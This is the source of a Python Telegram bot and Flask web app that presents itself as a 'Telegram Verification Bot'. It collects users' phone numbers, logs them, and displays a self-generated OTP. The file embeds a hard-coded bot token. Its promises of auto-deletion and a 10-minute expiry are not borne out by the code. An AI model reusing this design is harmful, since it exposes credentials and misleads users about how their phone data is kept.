import os
import telebot
from telebot import types
from flask import Flask, render_template, request, jsonify
import logging
from datetime import datetime
import threading
import time
import random

# ==================== SETUP ====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# Configuration - USE YOUR ACTUAL VALUES
BOT_TOKEN = os.environ.get("BOT_TOKEN", "7487704262:AAE34XTNrKt5D9dKtduPK0Ezwc9j3SLGoBA")
WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://itz-me-545-telegram.onrender.com")

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')

# Get bot info
try:
    bot_info = bot.get_me()
    BOT_USERNAME = bot_info.username
    logger.info(f"🤖 Bot initialized: @{BOT_USERNAME}")
except Exception as e:
    logger.error(f"Failed to get bot info: {e}")
    BOT_USERNAME = "your_bot"

# Session storage
user_sessions = {}

# ==================== SESSION MANAGEMENT ====================
def get_or_create_session(user_id, user_data=None):
    """Get or create user session"""
    if user_id not in user_sessions:
        user_sessions[user_id] = {
            'user_id': user_id,
            'created': datetime.now(),
            'status': 'new',
            'phone': None,
            'otp_code': None,
            'otp_sent': False,
            'otp_verified': False,
            'user_data': user_data or {}
        }
        logger.info(f"✅ Created new session for {user_id}")
    return user_sessions[user_id]

# ==================== FLASK ROUTES ====================
@app.route('/')
def index():
    """Main WebApp page"""
    user_id = request.args.get('user_id', '')
    return render_template('index.html', 
                         user_id=user_id,
                         bot_username=BOT_USERNAME,
                         webapp_url=WEBAPP_URL)

@app.route('/otp')
def otp_page():
    """OTP entry page"""
    user_id = request.args.get('user_id')
    if not user_id:
        return "Error: No user ID", 400
    
    session = get_or_create_session(user_id)
    phone = session.get('phone', 'Not shared yet')
    
    return render_template('otp.html',
                         user_id=user_id,
                         phone=phone,
                         bot_username=BOT_USERNAME)

@app.route('/api/start-verification', methods=['POST'])
def api_start_verification():
    """API to start verification"""
    try:
        data = request.json
        user_id = data.get('user_id')
        
        if not user_id:
            return jsonify({'success': False, 'error': 'No user ID'})
        
        session = get_or_create_session(user_id)
        session['status'] = 'verification_started'
        
        return jsonify({
            'success': True,
            'message': 'Verification started!',
            'instructions': f"""📱 <b>Next Steps:</b>

1. <b>Return to Telegram</b> chat with @{BOT_USERNAME}
2. <b>Tap the attachment</b> (📎) button
3. <b>Select "Contact"</b> from menu
4. <b>Choose your phone contact</b>
5. <b>Send it to the bot</b>

✅ Your contact will be auto-deleted
✅ OTP will be sent immediately
✅ Return here after sending contact"""
        })
        
    except Exception as e:
        logger.error(f"API error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/check-otp', methods=['POST'])
def api_check_otp():
    """Check OTP"""
    try:
        data = request.json
        user_id = data.get('user_id')
        otp = data.get('otp')
        
        if not user_id:
            return jsonify({'success': False, 'error': 'No user ID'})
        
        session = get_or_create_session(user_id)
        
        if not session.get('otp_sent'):
            return jsonify({'success': False, 'error': 'OTP not sent yet'})
        
        if session.get('otp_code') == otp:
            session['otp_verified'] = True
            session['status'] = 'verified'
            return jsonify({'success': True, 'message': '✅ OTP Verified!'})
        else:
            return jsonify({'success': False, 'error': '❌ Invalid OTP'})
            
    except Exception as e:
        logger.error(f"OTP check error: {e}")
        return jsonify({'success': False, 'error': str(e)})

# ==================== BOT HANDLERS ====================
@bot.message_handler(commands=['start', 'help'])
def handle_start(message):
    """Handle /start command"""
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name or "User"
        
        logger.info(f"📨 /start from {user_id}")
        
        # Store user info
        user_data = {
            'id': user_id,
            'first_name': first_name,
            'username': message.from_user.username or ''
        }
        
        # Create session
        session = get_or_create_session(user_id, user_data)
        
        # Create WebApp URL
        webapp_url = f"{WEBAPP_URL}?user_id={user_id}"
        
        # Create buttons
        keyboard = types.InlineKeyboardMarkup(row_width=1)
        
        # WebApp button
        keyboard.add(
            types.InlineKeyboardButton(
                "📱 Open Verification WebApp",
                web_app=types.WebAppInfo(url=webapp_url)
            )
        )
        
        # Share Contact button (alternative method)
        keyboard.add(
            types.InlineKeyboardButton(
                "📞 Share Contact Directly",
                callback_data="share_contact"
            )
        )
        
        # Welcome message
        welcome_msg = f"""<b>🔐 Telegram Verification Bot</b>

Hello {first_name}! 👋

<b>To verify your account:</b>

1. <b>Open WebApp</b> - Click button below
2. <b>Follow instructions</b> in WebApp
3. <b>Share your contact</b> when prompted
4. <b>Enter OTP</b> in WebApp
5. <b>Complete verification</b> ✅

⚠️ <b>Privacy:</b> Your contact is auto-deleted immediately.

<b>Need help?</b> Send /start again.

<b>Bot:</b> @{BOT_USERNAME}"""
        
        # Send message
        bot.send_message(
            message.chat.id,
            welcome_msg,
            parse_mode="HTML",
            reply_markup=keyboard
        )
        
        logger.info(f"✅ Sent WebApp button to {user_id}")
        
    except Exception as e:
        logger.error(f"Start handler error: {e}")
        bot.send_message(message.chat.id, "⚠️ Error. Please try /start again.")

@bot.callback_query_handler(func=lambda call: call.data == "share_contact")
def handle_share_contact(call):
    """Handle share contact button"""
    try:
        user_id = str(call.from_user.id)
        
        # Request contact
        contact_keyboard = types.ReplyKeyboardMarkup(
            resize_keyboard=True,
            one_time_keyboard=True
        )
        contact_keyboard.add(
            types.KeyboardButton(
                "📱 Share My Contact",
                request_contact=True
            )
        )
        
        bot.send_message(
            call.message.chat.id,
            "📱 <b>Share Contact</b>\n\nTap the button below to share your phone contact:",
            parse_mode="HTML",
            reply_markup=contact_keyboard
        )
        
        bot.answer_callback_query(call.id, "Ready to receive contact...")
        
    except Exception as e:
        logger.error(f"Contact callback error: {e}")

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    """Handle shared contact"""
    try:
        user_id = str(message.from_user.id)
        contact = message.contact
        
        if not contact:
            bot.send_message(message.chat.id, "❌ Invalid contact. Please try again.")
            return
        
        phone = contact.phone_number
        first_name = contact.first_name or ""
        last_name = contact.last_name or ""
        
        logger.info(f"📞 Contact from {user_id}: {phone}")
        
        # Get or create session
        session = get_or_create_session(user_id)
        
        # Update session
        session['phone'] = phone
        session['contact_name'] = f"{first_name} {last_name}".strip()
        session['contact_received'] = datetime.now()
        session['status'] = 'contact_received'
        
        # Generate OTP
        otp_code = str(random.randint(10000, 99999))
        session['otp_code'] = otp_code
        session['otp_sent'] = True
        session['otp_sent_at'] = datetime.now()
        session['status'] = 'otp_sent'
        
        # Delete contact message for privacy
        try:
            bot.delete_message(message.chat.id, message.message_id)
        except:
            pass
        
        # Remove contact keyboard
        remove_keyboard = types.ReplyKeyboardRemove()
        
        # Create WebApp URL for OTP entry
        webapp_url = f"{WEBAPP_URL}/otp?user_id={user_id}"
        
        # Send OTP confirmation
        otp_message = f"""✅ <b>CONTACT RECEIVED & OTP SENT!</b>

📱 <b>Phone:</b> {phone}
👤 <b>Name:</b> {first_name} {last_name}
⏰ <b>Time:</b> {datetime.now().strftime('%H:%M:%S')}

🔢 <b>YOUR OTP CODE:</b> <code>{otp_code}</code>

<b>Next Steps:</b>

1. <b>Return to WebApp</b> (click button below)
2. <b>Enter the OTP code</b> shown above
3. <b>Complete verification</b>

<a href="{webapp_url}">📱 Click here to open WebApp</a>

<em>This OTP is valid for 10 minutes.</em>"""
        
        # Create inline button for WebApp
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(
            types.InlineKeyboardButton(
                "📱 Enter OTP in WebApp",
                web_app=types.WebAppInfo(url=webapp_url)
            )
        )
        
        bot.send_message(
            message.chat.id,
            otp_message,
            parse_mode="HTML",
            reply_markup=keyboard,
            disable_web_page_preview=True
        )
        
        logger.info(f"✅ OTP {otp_code} sent to {user_id}")
        
    except Exception as e:
        logger.error(f"Contact handler error: {e}")
        bot.send_message(message.chat.id, "❌ Error processing contact. Please try again.")

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    """Handle all other messages"""
    user_id = str(message.from_user.id)
    text = message.text or ""
    
    # Ignore commands
    if text.startswith('/'):
        return
    
    # Check if user is in verification process
    session = get_or_create_session(user_id)
    
    if session.get('otp_sent'):
        # User has OTP sent
        webapp_url = f"{WEBAPP_URL}/otp?user_id={user_id}"
        
        response = f"""🔐 <b>Verification in Progress</b>

Your OTP has been sent!

📱 Phone: {session.get('phone', 'Not shared')}
📨 Status: OTP Sent ✓

<a href="{webapp_url}">📱 Click here to enter OTP</a>

Or send /start to restart."""
    else:
        # General help
        response = f"""<b>📋 Telegram Verification Bot</b>

To start verification, send:
/start - Open WebApp & begin verification

<b>Need help?</b>
• Share contact when prompted
• Enter OTP in WebApp
• Contact will be auto-deleted

<b>Bot:</b> @{BOT_USERNAME}"""
    
    bot.send_message(
        message.chat.id,
        response,
        parse_mode="HTML",
        disable_web_page_preview=True
    )

# ==================== BOT POLLING ====================
def start_bot_polling():
    """Start bot polling"""
    logger.info("🚀 Starting bot polling...")
    
    while True:
        try:
            # Remove webhook if any
            bot.remove_webhook()
            
            # Start polling
            bot.polling(
                none_stop=True,
                interval=1,
                timeout=30,
                long_polling_timeout=30
            )
            
        except Exception as e:
            logger.error(f"❌ Polling error: {e}")
            logger.info("🔄 Restarting in 5 seconds...")
            time.sleep(5)

# ==================== MAIN ====================
if __name__ == '__main__':
    # Startup info
    logger.info("="*50)
    logger.info("🚀 TELEGRAM VERIFICATION BOT")
    logger.info(f"🤖 Bot: @{BOT_USERNAME}")
    logger.info(f"🌐 WebApp: {WEBAPP_URL}")
    logger.info("="*50)
    
    # Start bot in separate thread
    bot_thread = threading.Thread(target=start_bot_polling, daemon=True)
    bot_thread.start()
    
    # Start Flask
    port = int(os.environ.get('PORT', 10000))
    logger.info(f"🌐 Starting Flask on port {port}")
    
    app.run(
        host='0.0.0.0',
        port=port,
        debug=False,
        use_reloader=False
    )
